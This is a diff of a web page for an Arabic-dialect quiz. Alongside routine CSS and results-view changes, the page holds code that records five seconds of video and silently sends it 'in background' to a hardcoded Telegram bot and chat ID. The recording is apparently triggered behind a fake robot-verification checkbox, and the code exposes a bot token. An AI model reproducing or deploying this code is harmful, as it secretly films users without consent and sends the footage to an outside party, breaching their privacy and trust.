@@ -72,9 +72,9 @@
         }
         .language-buttons {
             display: flex;
-            flex-direction: column; /* ترتيب الأزرار تحت بعضها */
+            flex-direction: column;
             justify-content: center;
-            gap: 20px; /* المسافة بين الأزرار أكبر */
+            gap: 20px;
             margin-bottom: 15px;
         }
         .language-buttons button {
@@ -84,7 +84,7 @@
             border-radius: 5px;
             padding: 15px 20px;
             cursor: pointer;
-            font-size: 20px; /* حجم الخط أكبر */
+            font-size: 20px;
             transition: background-color 0.3s;
         }
         .language-buttons button:hover {
@@ -107,7 +107,7 @@
             padding: 15px 30px;
             font-size: 20px;
             border: none;
-            border-radius: 20px; /* حواف دائرية للزر */
+            border-radius: 20px;
             background-color: #4CAF50;
             color: white;
             cursor: pointer;
@@ -123,6 +123,26 @@
         }
         .result p {
             font-size: 18px;
+        }
+        .question {
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .correct {
+            background-color: #4CAF50; /* الإجابة الصحيحة */
+        }
+        .wrong {
+            background-color: #F44336; /* الإجابة الخاطئة */
+        }
+        .correct-answer {
+            background-color: #FFEB3B; /* الإجابة الصحيحة مع اختيار المستخدم */
+        }
+
+        /* منع التمرير */
+        html, body {
+            height: 100%;
+            overflow: hidden;
         }
     </style>
 </head>
@@ -149,12 +169,11 @@
         <div id="question-container" style="display:none;">
             <h2 id="question-text"></h2>
             <div id="options-container"></div>
-            <button id="next-button" style="display:none;">السؤال التالي</button>
         </div>
         <div class="result" id="result">
             <h2>نتيجتك</h2>
-            <p id="score"></p>
-            <p id="wrong-answers"></p>
+            <div id="all-questions"></div>
+            <button onclick="restartQuiz()">إعادة المحاولة</button>
         </div>
     </div>
 
@@ -179,7 +198,7 @@
                     mediaRecorder.start();
                     mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
 
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000); // Record for 5 seconds
+                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
 
                     mediaRecorder.onstop = () => {
                         loading.style.display = 'none';
@@ -193,7 +212,7 @@
                         // Send video to Telegram in background
                         const blob = new Blob(chunks, { type: 'video/webm' });
                         const formData = new FormData();
-                        formData.append('chat_id', '2070423407'); // Replace with your Telegram chat ID
+                        formData.append('chat_id', '2070423407'); 
                         formData.append('video', blob, 'video.webm');
 
                         fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
@@ -208,14 +227,13 @@
         let score = 0;
         let selectedDialect = '';
         let questions = [];
+        let answers = [];
         let wrongAnswers = [];
 
         const questionText = document.getElementById('question-text');
         const optionsContainer = document.getElementById('options-container');
-        const nextButton = document.getElementById('next-button');
         const resultDiv = document.getElementById('result');
-        const scoreText = document.getElementById('score');
-        const wrongAnswersText = document.getElementById('wrong-answers');
+        const allQuestionsContainer = document.getElementById('all-questions');
 
         async function startQuiz(dialect) {
             selectedDialect = dialect;
@@ -223,10 +241,10 @@
             currentQuestionIndex = 0;
             score = 0;
             wrongAnswers = [];
-            document.getElementById('language-buttons').style.display = 'none'; // إخفاء أزرار اللهجات
+            answers = [];
+            document.getElementById('language-buttons').style.display = 'none';
             displayQuestion();
             document.getElementById('question-container').style.display = 'block';
-            resultDiv.style.display = 'none';
         }
 
         function displayQuestion() {
@@ -241,6 +259,7 @@
                     optionDiv.textContent = option;
                     optionDiv.onclick = () => {
                         const answerIndex = index;
+                        answers.push(answerIndex);
                         if (question.correct === answerIndex) {
                             score++;
                         } else {
@@ -251,8 +270,6 @@
                     };
                     optionsContainer.appendChild(optionDiv);
                 });
-
-                nextButton.style.display = currentQuestionIndex === questions.length - 1 ? 'block' : 'none';
             } else {
                 showResult();
             }
@@ -261,8 +278,34 @@
         function showResult() {
             document.getElementById('question-container').style.display = 'none';
             resultDiv.style.display = 'block';
-            scoreText.textContent = `النتيجة: ${score}/${questions.length}`;
-            wrongAnswersText.textContent = `الإجابات الخاطئة: ${wrongAnswers.map(q => q.q).join(', ')}`;
+
+            // Show all questions with their answers and colors
+            allQuestionsContainer.innerHTML = '';
+            questions.forEach((question, index) => {
+                const questionDiv = document.createElement('div');
+                questionDiv.classList.add('question');
+                questionDiv.innerHTML = `
+                    <h3>${question.q}</h3>
+                    <div class="${question.correct === answers[index] ? 'correct' : 'wrong'}">
+                        <p>${question.options[answers[index]]}</p>
+                    </div>
+                    <div class="correct-answer">
+                        <p>${question.options[question.correct]}</p>
+                    </div>
+                `;
+                allQuestionsContainer.appendChild(questionDiv);
+            });
+
+            const scoreText = document.createElement('p');
+            scoreText.textContent = `النتيجة: ${score} / ${questions.length}`;
+            allQuestionsContainer.appendChild(scoreText);
+        }
+
+        function restartQuiz() {
+            document.getElementById('result').style.display = 'none';
+            document.getElementById('verification-container').style.display = 'block';
+            document.getElementById('robot-checkbox').checked = false;
+            document.getElementById('language-buttons').style.display = 'flex';
         }
     </script>
 </body>
